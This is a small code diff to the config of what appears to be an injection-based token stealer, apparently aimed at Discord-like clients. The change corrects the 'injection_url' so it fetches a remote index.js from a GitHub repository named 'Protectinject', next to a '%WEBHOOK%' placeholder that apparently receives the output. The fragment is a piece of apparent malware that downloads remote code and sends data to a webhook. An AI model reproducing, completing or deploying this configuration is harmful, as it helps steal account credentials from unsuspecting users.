@@ -15,7 +15,7 @@ var config = {
     "init-notify": "true",
     "embed-color": 000000,
 
-    injection_url: "https://raw.githubusercontent.com/furax124/Protectinject/index.js",
+    injection_url: "https://raw.githubusercontent.com/furax124/Protectinject/main/index.js",
     webhook: "%WEBHOOK%",
     Filter: {
         "urls": [
